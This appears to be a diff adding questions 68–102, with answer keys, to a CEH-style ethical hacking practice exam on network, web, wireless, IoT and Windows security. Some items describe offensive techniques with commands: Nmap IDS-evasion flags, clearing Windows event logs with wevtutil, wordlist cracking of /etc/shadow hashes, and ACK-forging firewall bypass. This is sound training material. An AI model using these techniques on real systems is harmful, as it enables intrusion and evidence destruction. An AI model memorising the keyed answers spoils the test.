+B. Issue EHLO both before and (if permitted) after STARTTLS to list supported extensions from server responses
+C. Skip EHLO and issue HELO to reduce logging while inferring extensions from responses
+D. Send AUTH PLAIN anonymously to trigger an extensions list in the 5xx error reply
+Correct Answer: B Explanation: ESMTP-capable servers return supported extensions in response to EHLO; repeating EHLO after STARTTLS can reveal additional capabilities only offered on a secure channel (B). VRFY/EXPN (A) do not enumerate extensions and are frequently disabled. HELO (C) downgrades to basic SMTP, suppressing extension advertising. AUTH PLAIN without credentials (D) will usually return an error and does not enumerate the extensions list reliably.
+
+69. You’re testing a consumer IoT camera that is reachable from the Internet despite being behind a residential gateway. Packet captures show SSDP broadcasts and the gateway advertises Internet Gateway Device (IGD) services. Which technique most plausibly explains how the camera became externally reachable for its HTTP/RTSP interfaces?
+A. The device automatically registered its private IP in public DNS using dynamic DNS (DDNS) updates
+B. The device used STUN/TURN to create a persistent media relay outside the LAN for all traffic
+C. The router’s mDNS reflector bridged multicast service advertisements to the WAN for discovery
+D. An attacker (or the device) abused UPnP IGD to create external NAT port mappings to the camera
+Correct Answer: D Explanation: Abusing UPnP IGD (via AddPortMapping) is a classic IoT exposure vector, allowing silents creation of inbound NAT rules to private devices, making HTTP/RTSP interfaces reachable from the Internet without user awareness; many IoT devices or malware automate this. Option A (public DNS with private IP) does not provide reachability across NAT; Option B (STUN/TURN) typically aids outbound NAT traversal for peer connections but does not directly expose internal HTTP/RTSP listeners to arbitrary Internet clients; Option C (mDNS) is link-local and not designed to traverse WAN—reflectors do not create inbound TCP mappings—so D is the credible explanation consistent with CEH IoT attack knowledge.
+
+70. You discover UDP/111 open on a Linux server. You need to identify exposed ONC RPC programs (e.g., mountd, nlockmgr) and the dynamic high ports they map to so you can focus subsequent scans. Which is the BEST next step?
+A. nmap -sS -p2049 --script nfs-ls to list NFS exports directly.
+B. showmount -e target to enumerate exports and assume related ports are open.
+C. nc -u -vz target 111 and guess the program numbers from timing differences.
+D. nmap -sU -sV -p111 --script rpcinfo target to query the portmapper and enumerate program→port mappings.
+Correct Answer: D Explanation: The ONC RPC portmapper (portmap/rpcbind) on UDP/111 maintains program number to port mappings; nmap --script rpcinfo queries it to enumerate services (e.g., nfs, mountd, status, nlockmgr) and their actual listening ports (often high/random), enabling efficient, targeted service discovery—precisely the CEHv13-aligned workflow. Option A jumps straight to NFS on 2049/TCP and a specific script; it may miss other RPC programs and won’t tell you their ports. Option B can list exports when NFS is reachable but does not reveal all RPC services or ports. Option C provides no structured RPC enumeration and guessing from timing is unreliable.
+
+71. To limit successful network-level hijacking of plaintext services on corporate Wi-Fi, which control MOST directly prevents passive cookie/session sniffing and replay?
+A. Enforce use of WPA2/WPA3 with strong PSKs or 802.1X and require application-level TLS for all services (HTTPS/TLS everywhere)
+B. Disable SSID broadcasting (hide the SSID) to obscure the wireless network from attackers
+C. Limit DHCP lease times to 30 minutes to cause frequent re-auth
+D. Configure APs to use WEP for legacy compatibility
+Correct Answer: A Explanation: Using strong Wi-Fi encryption (WPA2/WPA3 with 802.1X) reduces passive sniffing on the link layer, and enforcing TLS for application traffic (HTTPS/TLS everywhere, HSTS) prevents session tokens from traversing unencrypted — combined, they most directly mitigate passive capture and replay of session tokens on public/untrusted Wi-Fi. Option B (hiding SSID) is security by obscurity and does not stop attackers with simple scanning tools. Option C (short DHCP leases) does not prevent sniffing or replay of captured session data. Option D (WEP) is insecure and trivial to break; it increases risk.
+
+72. An online lender suffers a surge in new-account fraud where criminals open accounts using stolen/synthetic identities that later default. Which single control set MOST effectively reduces identity theft at account opening with minimal user friction for legitimate applicants?
+A. CAPTCHA challenges plus IP rate limiting during signup
+B. Static KBA (“Which street did you live on in 2012?”) sourced from data brokers
+C. Mutual TLS client certificates for all customers’ browsers
+D. Identity proofing per NIST SP 800-63A with document verification + selfie liveness, device binding, risk-based decisioning, and KYC watchlist checks
+Correct Answer: D Explanation: Robust identity proofing aligned to NIST SP 800-63A (D) combines authoritative document checks with anti-spoofing liveness, device fingerprinting/binding, and risk engines (velocity, IP/ASN reputation, behavioral biometrics) plus KYC/AML checks, which is the current best practice to deter synthetic/stolen identity opening; CAPTCHA+rate limits (A) deter bots but not human fraud or stolen PII; static KBA (B) relies on knowledge widely available via breaches/data brokers and is weak; client mTLS (C) is impractical for consumer onboarding and does not prove the legal identity of the person behind the device.
+
+73. A customer requires that directory queries never expose credentials or content in cleartext and must provide integrity and server authentication. Which configuration MOST directly satisfies this requirement for LDAP-based management?
+A. Simple bind over TCP/389 with SASL EXTERNAL and DNSSEC enabled on the zone
+B. LDAPS (TCP/636) with a self-signed server certificate and anonymous bind only
+C. LDAP simple bind over TCP/389 with IPsec transport mode between clients and DCs
+D. Enforce LDAP signing and channel binding with StartTLS (or LDAPS) using a CA-issued certificate and SASL/Negotiate or SASL/GSSAPI
+Correct Answer: D Explanation: LDAP signing (integrity) plus channel binding and TLS (StartTLS on 389 or native LDAPS on 636) with a trusted CA-issued server certificate ensures confidentiality, integrity, and server authentication; using SASL/Negotiate (Kerberos) or SASL/GSSAPI further provides strong client auth (D). Option A confuses mechanisms: SASL EXTERNAL requires a TLS client cert or external security layer; simply using simple bind over 389 with DNSSEC does not encrypt the LDAP session. Option B provides encryption but a self-signed cert breaks server authentication at scale, and anonymous bind fails the “mutual identity verification” goal. Option C could protect transport, but it is heavy operationally and does not inherently add LDAP signing/channel binding semantics or robust server identity to LDAP itself.
+
+74. An enterprise requires email encryption that allows employees to exchange encrypted emails with external partners without relying on a central certificate authority. Which solution is MOST suitable?
+A. S/MIME with Active Directory Certificate Services
+B. PGP with a Web of Trust model
+C. TLS enforced between internal and external mail gateways
+D. DKIM signatures with DNS-based public keys
+Correct Answer: B Explanation: PGP with a Web of Trust allows decentralized trust, enabling secure email exchange without requiring a central CA, making B correct. A requires enterprise-managed certificates and is not easily interoperable with external partners. C only secures email in transit and does not provide end-to-end encryption. D (DKIM) is for domain-level integrity and anti-spoofing, not for end-to-end confidentiality.
+
+75. A web application runs as a local unprivileged user; you find an application component that performs image processing by invoking ImageMagick binaries as that user. The server process (setuid helper) incorrectly allows user-supplied filenames that are treated as directives. Which exploitation method MOST directly leads to local privilege escalation when a privileged helper processes attacker-controlled input?
+A. Upload a malicious image file that contains crafted image metadata/directives to exploit ImageMagick’s processing (ImageTragick-style) and cause arbitrary command execution in the helper’s context.
+B. Attempt a race condition on a temporary file to cause denial of service.
+C. Use the application to send spam e-mail to exfiltrate data.
+D. Modify client browser cookies to change session state.
+Correct Answer: A Explanation: Option A is correct because historically ImageMagick (ImageTragick) flaws allowed attackers to embed processing directives or crafted payloads in image files that, when passed to an insecure image processing helper running with higher privileges, resulted in arbitrary command execution. If a privileged helper blindly processes attacker-controlled files and image processing tools accept action directives, this can escalate from unprivileged web context to higher privileges on the host. CEH covers such cases under local/remote exploitation via insecure file processing. Option B (race conditions) may sometimes be impactful but is less direct and may require precise timing and additional vulnerabilities. Option C (sending spam) is an abuse of functionality and does not itself escalate local privileges. Option D (cookie modification) is an application-level attack and will not yield system privilege escalation absent other issues. Defenses: sanitize inputs before passing to system utilities, run image processing in isolated sandboxes with least privilege, remove unsafe delegates/features from ImageMagick, and monitor for suspicious child process creation.
+
+76. POST /api/users with body {"email":"u@ex.com","plan":"pro","isAdmin":false}. When you resend with {"email":"u@ex.com","plan":"pro","isAdmin":true}, your new account receives elevated privileges because the server’s model binder persists all fields by default. Which weakness are you exploiting?
+A. CSRF because the request lacked an anti-CSRF token
+B. SSRF because JSON is posted to a backend service
+C. Weak session management due to long-lived cookies
+D. Mass assignment/over-posting leading to privilege escalation
+Correct Answer: D Explanation: Mass assignment (D) occurs when frameworks auto-bind client-supplied fields directly to server-side models, allowing attackers to set security-sensitive attributes (e.g., isAdmin, role, creditLimit) unless explicitly whitelisted/filtered; this is an authorization flaw because the server trusts client claims to set privileges. CSRF (A) involves cross-site triggering but would not create admin rights if the backend validated fields. SSRF (B) is unrelated to model binding. Cookie lifetime (C) doesn’t explain privilege creation during account creation. Prevent with allowlist binding, DTOs that omit sensitive fields, server-side privilege grants only by authorized actors, and unit/integration tests to verify forbidden fields are ignored.
+
+77. During a security review of an RSN (WPA2) network, the team asks which key encrypts broadcast and multicast traffic on the BSS. Which statement is correct?
+A. The PTK (Pairwise Transient Key) encrypts broadcast/multicast so all stations can decrypt
+B. The PMK (Pairwise Master Key) encrypts unicast and broadcast traffic directly on the air
+C. The GTK (Group Temporal Key) encrypts broadcast/multicast frames; it is distributed in the group key handshake and rotated periodically
+D. The IGTK (Integrity Group Temporal Key) encrypts beacons to hide SSIDs and management metadata
+Correct Answer: C Explanation: In RSN, unicast frames use the PTK, while broadcast/multicast frames are protected with the GTK distributed by the AP via the group key handshake; periodic rotation limits group exposure, making C correct. A is incorrect because the PTK is for pairwise unicast between AP and a specific STA. B is incorrect since the PMK seeds the 4-way handshake; it is not used to encrypt frames directly. D is incorrect because IGTK (BIP) provides integrity for certain management frames (e.g., deauth/disassoc) under 802.11w; it does not encrypt beacons or hide SSIDs.
+
+78. An enterprise wants stronger protection against fileless attacks leveraging PowerShell, JScript, and macro-spawned interpreters. Which Windows interface do modern anti-malware engines use to scan script content pre-execution and feed detections to the EPP/EDR?
+A. Address Space Layout Randomization (ASLR)
+B. Anti-Malware Scan Interface (AMSI)
+C. Early Launch Anti-Malware (ELAM)
+D. SmartScreen reputation service
+Correct Answer: B Explanation: B is correct because AMSI exposes script content (PowerShell, WSH, VBA, etc.) to anti-malware before or at execution time, enabling content inspection and dynamic blocking—critical for fileless defenses. ASLR (A) is a memory-hardening feature, not an inspection API. ELAM (C) validates boot-start drivers early in the chain but does not scan scripts. SmartScreen (D) provides URL/download/app reputation—useful but not the pre-execution script scanning AMSI delivers. CEH emphasizes AMSI + behavior analytics (EDR) + ASR/WDAC as layered defenses.
+
+79. During detonation, an unknown binary spawns a legitimate process that soon contains a private memory region with MZ/PE headers, is marked executable (PAGE_EXECUTE_READWRITE), and has no file-backed mapping; a new thread starts at an address inside that region. Which finding MOST definitively indicates memory-resident post-exploitation code?
+A. A spike in CPU usage by the spawned process for ~30 seconds
+B. Creation of a persistence Run key under HKCUSoftwareMicrosoftWindowsCurrentVersionRun
+C. The parent process has a valid Microsoft Authenticode signature
+D. An in-memory PE image with executable permissions, no on-disk mapping, and a thread start address inside it
+Correct Answer: D Explanation: D is correct: a PE image resident in a private executable region with a thread starting inside it, and no associated file mapping, is classic evidence of reflective loading/injection (e.g., process hollowing, reflective DLL injection), supporting fileless or memory-only stages; confirm with Volatility (malfind, ldrmodules) or PE-sieve/HollowsHunter. A (CPU spike) is nonspecific. B (Run key) is persistence but not injection proof. C (valid signature) says nothing about subsequent memory tampering; signed parents often host injected code. CEH stresses memory forensics for fileless behavior and ATT&CK T1055 (Process Injection).
+
+80. Post-incident forensics show that the origin CPU spiked due to excessive TLS handshakes during the attack. The configuration allowed TLS renegotiation and did not enforce session resumption; ECDHE was supported but not preferred, and TLS 1.3 was disabled. Which configuration change would MOST reduce computational asymmetry in similar future attacks?
+A. Prefer TLS 1.3 with ECDHE, disable renegotiation, and enforce session resumption (tickets/PSK) with rate limits
+B. Switch all certificates to wildcards to simplify certificate management
+C. Disable OCSP stapling to shorten the handshake
+D. Force HTTP/1.0 keep-alive off so clients reconnect more frequently
+Correct Answer: A Explanation: TLS 1.3 eliminates renegotiation, streamlines the handshake to a single round-trip, and—combined with ECDHE key exchange and mandatory session resumption—dramatically lowers per-connection server cost and enables rate limiting abnormal handshake spikes; this directly counters handshake-focused DoS. Option B (wildcards) affects management, not crypto cost. Option C increases latency and origin work (due to client-side OCSP fetching) and does not reduce handshake CPU. Option D would worsen load by increasing connection churn, benefiting attackers rather than defenders.
+
+81. A tester fuzzes a GraphQL endpoint and successfully executes queries for fields not exposed in the documentation. What risk does this represent?
+A. Version mismatch between API and documentation
+B. Insecure Direct Object Reference
+C. Overly permissive GraphQL schema without proper authorization checks
+D. Denial-of-service via introspection
+Correct Answer: C Explanation: GraphQL schemas often expose many fields, and without proper authorization checks, attackers can query sensitive or undocumented fields (C). Version mismatch (A) is less critical. IDOR (B) may exist but is not the main risk here. DoS via introspection (D) is a different issue. Mitigation includes disabling introspection in production, enforcing authorization at field resolvers, and schema hardening.
+
+82. After controlled PoCs on a test PLC, stakeholders ask for final deliverables. Which output is MOST consistent with a mature CEH-aligned OT hacking methodology?
+A. A report with executive summary, system-by-system findings (CVEs/misconfigurations), mapped to consequence scenarios, reproducible steps validated in lab, evidence (pcaps, screenshots), risk ratings tailored to safety/availability, and remediation plan prioritized by kill chain; plus a rollback/cleanup log
+B. A list of IPs that responded to ping and screenshots of Shodan searches
+C. A single-page memo stating “segmentation is weak” with no evidence
+D. A spreadsheet of guessed vulnerabilities based on firmware brand names
+Correct Answer: A Explanation: Mature methodology culminates in actionable reporting: tie technical findings to process consequences, include reproducible lab-validated steps, provide evidence, rate risk in OT terms (safety, environment, downtime), and offer prioritized mitigations; also document cleanup/rollback. B/C/D lack rigor, evidence, and OT-specific risk framing.
+
+83. A healthcare provider is required to follow HIPAA regulations to secure patient information. Which aspect of information security does HIPAA primarily emphasize?
+A. Maintaining uptime of medical devices
+B. Protecting the confidentiality and privacy of patient health information
+C. Ensuring the accuracy of billing transactions
+D. Developing encryption algorithms for the healthcare industry
+Correct Answer: B Explanation: HIPAA primarily enforces confidentiality and privacy of patient data. A relates to availability but is not HIPAA’s central concern. C relates to integrity but is secondary. D is irrelevant since HIPAA does not mandate development of algorithms. CEHv13 examines regulatory frameworks to highlight compliance drivers in security programs.
+
+84. A security reviewer notes the application calls stored procedures but also sees dynamic SQL built inside those procedures via string concatenation of user input (EXEC(@sql)). Which statement BEST describes the safety of stored procedures in this context?
+A. Stored procedures are always safe against SQL injection, no further action needed.
+B. Stored procedures automatically sanitize user input so dynamic SQL inside them cannot be exploited.
+C. Stored procedures can still be vulnerable if they construct dynamic SQL via concatenation; using parameterized calls or sp_executesql with parameters is required.
+D. Stored procedures eliminate the need for any input validation in the application layer.
+Correct Answer: C Explanation: Stored procedures are not inherently safe if they build dynamic SQL by concatenating untrusted input — such procedures remain vulnerable. The correct mitigation is to use parameterized execution (e.g., sp_executesql with parameters in SQL Server) or avoid dynamic SQL entirely. Option A is false because stored procedures can contain insecure dynamic SQL. Option B is incorrect — stored procedures do not magically sanitize input. Option D is false — application-layer validation is still important (for business rules, length checks, canonicalization) even when using secure DB access methods.
+
+85. During the initial reconnaissance phase against a target web server, a tester captures HTTP response headers and TLS certificates to determine server software and virtual hosting configuration. Which technique best describes this step in the web server attack methodology?
+A. Fingerprinting and service enumeration
+B. Exploit development
+C. Post-exploitation persistence
+D. Input validation fuzzing
+Correct Answer: A Explanation: Fingerprinting and service enumeration is the correct description: collecting response headers, server banners, TLS certificate Subject/SAN fields, and host header behavior are standard fingerprinting activities used to identify server type/version (e.g., Apache/2.4.49), virtual hosts, and potential targets for specific exploits; common tools include nmap -sV --script=http-headers, openssl s_client -connect, WhatWeb, and Wappalyzer. Option B (Exploit development) is incorrect because exploit development occurs later after vulnerabilities are identified and requires coding or PoC creation, not passive identification. Option C (Post-exploitation persistence) is incorrect since persistence happens after successful compromise. Option D (Input validation fuzzing) is incorrect because fuzzing is an active testing technique aimed at discovering input-handling bugs rather than passive enumeration and fingerprinting.
+
+86. You need an active OS fingerprinting tool that applies fuzzy logic/weighted signatures across multi-protocol probes (TCP/ICMP/UDP) to produce probabilistic OS matches, especially effective when direct ports are limited. Which tool BEST fits?
+A. p0f
+B. Xprobe2
+C. Hping3
+D. Nmap with -sV
+Correct Answer: B Explanation: Xprobe2 implements active, heuristic/fuzzy OS identification by sending a compact set of probes and scoring responses to produce probabilistic matches—well known in CEHv13 for OS discovery when conditions are constrained. Option A (p0f) is passive only and does not transmit probes. Option C (hping3) is a packet crafter useful for custom tests and TTL/flag manipulation, but it does not provide a built-in OS fingerprinting knowledge base. Option D (-sV) is service version detection (banner grabbing), not OS stack fingerprinting.
+
+87. When you need to craft custom packets (e.g., malformed TCP/IP frames, custom ARP replies) and send them on the wire for targeted tests or to simulate sniffing-related attacks, which tool/library is MOST suitable?
+A. Wireshark
+B. tcpdump
+C. Scapy
+D. driftnet
+Correct Answer: C Explanation: Scapy (C) is a Python-based packet construction/manipulation library and interactive tool that lets you build arbitrary L2–L7 packets, send and receive them, implement custom protocol logic, and script complex attack scenarios (ARP spoofing, custom ICMP/TCP sequences, etc.). It is ideal for crafting test traffic and fuzzing. Wireshark (A) is passive analysis and cannot craft/send packets. tcpdump (B) is capture-only (though it can print packet contents), not a packet generator for arbitrary crafted frames. driftnet (D) passively extracts images from streams and has no packet-crafting capability. Scapy is commonly used in CEHv13 labs for active tests where custom packets or injection are required.
+
+88. A regional retailer is hit by a 700-Gbps UDP reflection flood (CLDAP + DNS). Servers and WAFs are healthy but unreachable because the 10-Gbps circuit is saturated before traffic reaches your edge. Which protection tool or capability restores availability the FASTEST in this situation?
+A. On-prem next-gen firewall with advanced IPS signatures
+B. Local iptables/nftables rate limiting on the web heads
+C. SIEM correlation rules to auto-open incidents in the ITSM tool
+D. Cloud-based DDoS scrubbing service using BGP diversion/anycast with GRE/IPsec return (e.g., provider scrubbing center)
+Correct Answer: D Explanation: Cloud DDoS scrubbing (anycast/bgp diversion) is the only option listed that removes attack volume upstream, cleaning traffic before it ever touches your congested access circuit; providers advertise your /24 or a more specific route and backhaul “clean” traffic to you via GRE/IPsec—restoring reachability under volumetric floods. Option A cannot help when the choke point is the WAN link; the firewall never sees most clean traffic because the pipe is saturated. Option B acts after packets arrive on-prem (too late) and is appropriate for small protocol attacks, not multi-hundred-Gbps floods. Option C improves process/visibility, not packet disposition; SIEM rules do not mitigate bandwidth exhaustion.
+
+89. During a forensic acquisition, investigators find that a Linux system uses dm-crypt with LUKS for disk encryption. Which piece of information is MOST essential to decrypt the disk contents?
+A. The system’s root password
+B. The passphrase or key material protecting the LUKS keyslots
+C. The user’s SSH private key
+D. The BIOS administrator password
+Correct Answer: B Explanation: LUKS stores master keys in encrypted keyslots, which are unlocked by passphrases or other key material. Without this, decryption is impossible, making B correct. A (root password) only provides OS access if the system is booted but is not equivalent to the disk key. C (SSH private key) is unrelated to disk decryption. D (BIOS password) prevents boot or configuration changes but does not unlock LUKS.
+
+90. During a pentest you obtain /etc/shadow entries with salted SHA-512 hashes for Linux accounts. You want to prioritize accounts likely to be weak (common passwords) for cracking. Which approach is BEST?
+A. Use a targeted wordlist (rockyou, breach corpuses) combined with rule-based mangling and username-to-password heuristics (e.g., common substitutions), then run Hashcat in CPU-only mode.
+B. Immediately run an exhaustive brute-force across all possible printable characters up to 12 characters long.
+C. Submit the shadow file to an online cracking service for instant results without preprocessing.
+D. Rely solely on Kerberoasting to get plaintext passwords for Linux accounts.
+Correct Answer: A Explanation: Option A is correct because prioritized cracking leverages curated wordlists (e.g., rockyou, dark web breach corpora) plus rule-based mangling (Hashcat/John rules) and heuristics like username↔password variants to efficiently target weak, human-chosen passwords; this focused strategy yields results far faster than blind brute force and is standard CEH methodology. CPU-only mode is suboptimal for speed—ideally you'd use GPU acceleration—but the core idea of targeted wordlists + rules is the correct tactic. Option B (exhaustive brute force) is computationally expensive and time-consuming for SHA-512 with salt and is not an efficient first-stage approach. Option C carries the same legal/privacy concerns as previously noted and often is slower or inappropriate; CEH emphasizes controlled, local cracking under the rules of engagement. Option D (Kerberoasting) is an Active Directory / Kerberos technique and irrelevant to local Linux /etc/shadow hashes.
+
+91. A company hosts an e-commerce website that frequently faces SSL/TLS downgrade attempts. To mitigate this, the security team disables support for outdated ciphers and enforces TLS 1.2+. Which web server concept does this address?
+A. Content negotiation
+B. Transport layer hardening
+C. Directory listing prevention
+D. Virtual directory structure
+Correct Answer: B Explanation: Transport layer hardening involves securing the web server’s encryption protocols by disabling weak SSL/TLS versions and enforcing strong ciphers to prevent downgrade and MITM attacks. Option A is incorrect because content negotiation deals with selecting versions of content, not encryption protocols. Option C is incorrect since directory listing prevention involves restricting directory content exposure. Option D is incorrect as virtual directory structure relates to logical resource organization, not encryption.
+
+92. You are scanning a remote DMZ subnet over the Internet. The firewall drops ICMP Echo, but web traffic is allowed. You want a fast, low-noise way to identify which IPs are up before deeper enumeration. Which technique is BEST?
+A. nmap -sn -PE -PP to use ICMP Echo and Timestamp requests.
+B. Run traceroute to each IP then nmap -sL (list scan) to validate hosts.
+C. nmap -sn -PU53,123 to leverage UDP DNS/NTP pings.
+D. nmap -sn -PS80,443 -PA443 to send TCP SYN/ACK “pings” on commonly permitted ports.
+Correct Answer: D Explanation: When ICMP is dropped, TCP “pings” to likely permitted ports are effective; -PS80,443 sends SYN probes and -PA443 sends ACK probes that many stateful firewalls permit due to common web flows, so any SYN/ACK or RST indicates a live host—an approach CEHv13 highlights for WAN/DMZ discovery. Option A depends on ICMP (Echo/Timestamp), which is filtered here. Option B confuses address listing (-sL doesn’t probe) with discovery and adds latency without proving host liveness. Option C (UDP pings) often suffers from ICMP rate-limiting and silent drops; many devices do not send Port Unreachable, leading to false negatives, so it is less reliable than TCP probes on 80/443 for Internet-facing ranges.
+
+93. You are asked to quickly identify all Internet-facing hosts with TCP/22 open across several /8 spaces under a tight time window, where depth (service fingerprints) can be deferred to a second pass. Which scanning tool is most appropriate to achieve extremely high-rate SYN probing using a user-space TCP/IP stack and rate control?
+A. Masscan
+B. Nmap with -sS -T5
+C. ZMap using an HTTP probe
+D. Unicornscan
+Correct Answer: A Explanation: Masscan is purpose-built for Internet-scale, ultra-high-throughput SYN probing, implementing its own user-space TCP/IP stack and explicit rate control (e.g., millions of pps) while permitting multiple target ports per run; this makes it the right choice for a first-pass “who’s listening on port 22” sweep, after which results are commonly verified or enriched with Nmap -sV/NSE. Option B (Nmap -sS -T5) is excellent for flexible, high-fidelity scanning and scripting, but it’s constrained by kernel networking and is not optimized for the same extreme rates as Masscan. Option C (ZMap) is also a high-speed scanner but is generally single-probe/port per run and the “HTTP probe” is mismatched with the requirement for TCP/22; ZMap is better when you want fast, uniform, one-port probing with custom probe modules. Option D (Unicornscan) supports asynchronous scanning but is older, less commonly used today, and typically does not match Masscan’s raw throughput or workflow integration for large Internet-scale surveys.
+
+94. Which Windows log-clearing attempt is MOST likely to be partially successful but still leave other system-level evidence that adversaries often overlook?
+A. Using wevtutil cl System to clear the System log — leaving auditing of the clear operation in the Security log only if Security exists.
+B. Stopping the Event Log service and deleting EVTX files while leaving the Security log intact.
+C. Using an AV product’s cleanse API to remove artifacts from quarantine.
+D. Wiping the paging file pagefile.sys to remove memory-resident traces.
+Correct Answer: B Explanation: Option B (stopping the Windows Event Log service, deleting .evtx files, then restarting) can remove many local event files; however, it often leaves secondary artifacts such as MFT records, file system timestamps, service stop/start events in other logs, or forwarded copies already shipped to SIEM — CEH emphasizes that deleting files is noisy and leaves lower-level artifacts. Option A (clearing the System log) will remove System events but not necessarily evidence recorded elsewhere; moreover, clearing System does not produce the universal 1102 for Security but may trigger other logs. Option C (using an AV cleanse API) addresses only AV-managed quarantine artifacts and is not a general log-clearing technique. Option D (wiping pagefile.sys) might remove some memory artifacts swapped to disk, but pagefile wiping is destructive, time-consuming, and often impractical; moreover, many systems are configured to clear pagefile at shutdown which is different. Overall, deleting EVTX files is partially effective but leaves detectable forensic traces that defenders can correlate.
+
+95. On a hardened NTP appliance, monlist queries are blocked, but you still need detailed server state: system variables (stratum, refid, root delay), selected peer, and time since last sync. Which ntpq query is MOST appropriate?
+A. ntpq -c rv <target>
+B. ntpq -c opeers <target>
+C. ntpdc -c sysinfo <target>
+D. ntpq -c mrulist <target>
+Correct Answer: A Explanation: ntpq -c rv (readvar) pulls system variables (e.g., stratum, refid, rootdelay, rootdisp, offset, jitter, sys_jitter, reftime, leap), which provide a rich snapshot of time state even when monlist is blocked (A). opeers (B) is a variant of the peers billboard focused on one-shot display but still doesn’t expose the full system variable set. ntpdc (C) is deprecated and often disabled; modern servers prefer ntpq/ntpsec tooling. mrulist (D) enumerates most-recently-used clients when enabled; it’s useful for client discovery but not the best choice for system state.
+
+96. An operations team uses an automation tool (Ansible) to apply web server configuration and security patches across hundreds of hosts. Which practice ensures that automation does not accidentally introduce insecure configurations during patching?
+A. Run ad-hoc playbooks directly against production hosts without version control
+B. Maintain infrastructure-as-code in a VCS, use code review/CI pipelines to lint and test playbooks, and perform dry-run (check) executions before applying changes
+C. Disable idempotence checks to speed up execution time
+D. Allow each admin to maintain their own private playbooks and run them manually
+Correct Answer: B Explanation: Storing IaC/automation playbooks in version control, enforcing peer review, running linting/validation (e.g., ansible-lint), executing tests in CI, and using dry-run/check mode are best practices to prevent accidental insecure state changes. This ensures reproducibility, auditability, and enables rollbacks via the VCS. Option A is unsafe—ad-hoc runs without tracking increase drift and risk. Option C is incorrect; idempotence is vital to ensure consistent end-state. Option D creates configuration drift, reduces oversight, and impedes incident response.
+
+97. Which approach is MOST effective for uncovering subtle application logic flaws during a web test?
+A. Rely exclusively on automated vulnerability scanners with default policies
+B. Model the application’s state machine and business invariants, then perform stateful, sequence-aware negative testing (e.g., reordering steps, replaying tokens, testing boundary conditions) using an intercepting proxy (Burp/ZAP) to tamper with workflow variables
+C. Run only static code analysis to flag injection sinks
+D. Focus solely on header/cookie hardening and TLS configuration
+Correct Answer: B Explanation: Logic flaws are stateful and business-specific; they’re best found by modeling workflows/invariants and conducting sequence-aware negative tests—skipping steps, replaying/expiring tokens, racing requests, and boundary testing—while tampering with server-interpreted variables via a proxy; scanners (A) often miss semantic issues; static analysis (C) is valuable but biased toward code patterns (e.g., injection) not emergent workflow bugs; transport/header hardening (D) doesn’t reveal or prevent business-rule violations—effective practice pairs modeling with manual exploration, selective automation, and evidence-backed reproduction steps.
+
+98. You need to evade a signature-based IDS that keys on “normal” TCP header layouts and common payload lengths. Which Nmap evasion combination is MOST appropriate to alter on-wire characteristics without changing the logical scan type?
+A. --mtu 8 plus --data-length 37 to fragment probes and pad payloads, potentially evading naive signatures and middleboxes that don’t normalize/defragment.
+B. -O --osscan-guess to randomize OS probe sequences and avoid IDS.
+C. --top-ports 100 so fewer ports are scanned, reducing detection to zero.
+D. -sT because completing the handshake always bypasses IDS.
+Correct Answer: A Explanation: CEHv13 covers packet morphology changes to degrade rigid signatures: --mtu forces fragmentation, while --data-length pads contents to non-default sizes; some IDS/IPS under-normalize, letting fragmented or oddly sized packets slip past port-scan signatures. Option B concerns OS detection and does not affect signature bypass directly. Option C reduces scope but not detectability; fewer probes can still trigger rules. Option D is incorrect—Connect() traffic is easily detected and often more visible in server logs.
+
+99. An external ACL allows “established” TCP traffic defined only as “packets with ACK set,” but inbound NEW connections are blocked. A tester forges TCP packets with the ACK bit set to a protected service and receives responses, effectively bypassing the rule. What allowed this firewall evasion?
+A. Using crafted ACK packets to exploit a stateless “established” rule that doesn’t validate handshakes
+B. Launching a SYN flood to overwhelm the state table and slip through
+C. Enabling IP source routing options to steer around the edge device
+D. Performing a FIN scan to hide from port-based filtering
+Correct Answer: A Explanation: A is correct because a stateless rule that treats “ACK set” as equivalent to established traffic can be evaded by forging ACKs; without true state tracking (SYN→SYN-ACK→ACK), the firewall lets through packets that appear to belong to an existing flow. B (SYN flood) is a DoS tactic and not the reason the packets passed policy. C (source routing) is typically dropped by modern routers/firewalls and doesn’t explain acceptance of ACK-only packets. D (FIN scan) is a reconnaissance flag tactic and does not result in policy bypass for non-handshaked connections.
+
+100. A fleet of IP cameras currently accepts unauthenticated HTTP firmware updates. Security wants a robust supply-chain control that prevents firmware tampering even if the update server or network is compromised. Which technical control provides the strongest protection?
+A. Implement signed firmware updates using code signing with a vendor-managed private signing key and verify signatures (and certificate chains) in the bootloader before installation (secure boot).
+B. Host the firmware on a separate HTTP server and implement IP-based access control lists to restrict who can upload files.
+C. Switch update delivery to HTTPS only and rely on TLS to ensure integrity.
+D. Obfuscate firmware binaries using a packer to make reverse engineering harder for attackers.
+Correct Answer: A Explanation: Cryptographic firmware signing combined with secure-boot verification in the bootloader ensures devices will only install firmware authorized by the vendor even if the update server is compromised or an attacker performs a MITM — this defends the update chain end-to-end. IP ACLs (B) help but can be bypassed (e.g., compromised CI/CD). HTTPS alone (C) protects transport but doesn’t prevent an attacker who compromises the update server or CA from serving malicious images; it lacks end-device cryptographic verification. Obfuscation (D) is not a security boundary and does not prevent tampered firmware installation.
+
+101. A team is hardening an exported Android Service that performs high-risk operations. Only applications from the same developer should be able to bind and call it programmatically. Which permission type best enforces this?
+A. dangerous permission granted at runtime to any requesting app
+B. normal permission automatically granted at install time
+C. signature permission requiring caller and callee to be signed with the same certificate
+D. runtime permission requiring the user to approve the request via a system dialog
+Correct Answer: C Explanation: A signature permission restricts access to apps signed with the same signing key, which is the intended control for inter-app trust within one publisher—hence C. dangerous (A) and runtime (D) refer to user-granted capabilities for any app and do not enforce publisher equivalence. normal (B) is auto-granted and not appropriate for sensitive IPC.
+
+102. The application normalizes error pages and timing, but you suspect blind SSRF or XXE reachable via a JSON upload. Which validation approach MOST aligns with the “test and validate” phase of a web app hacking methodology?
+A. Increase payload size to force a 500 error, proving code execution
+B. Rely on developer tools’ network tab; if there’s no visible failure, the vector is closed
+C. Focus only on timing-based probes; if latency changes < 1s, conclude no issue
+D. Use out-of-band interaction testing (e.g., Burp Collaborator or an external DNS/HTTP listener) to detect callbacks from the server, confirming blind vulnerabilities without relying on in-band responses
+Correct Answer: D Explanation: For blind classes (SSRF, XXE with external entities, blind command/LDAP DNS exfiltration), OAST is the gold-standard validation: embed a unique interaction domain/URL and observe server-initiated DNS/HTTP traffic; this preserves safety and provides strong evidence; (A) is non-specific and may cause availability issues; (B) only shows client-side traffic, not server egress; (C) timing analysis can help but is noisy and inconclusive; methodology recommends controlled OAST plus strict scoping and logging to validate hypotheses before escalating testing.
+
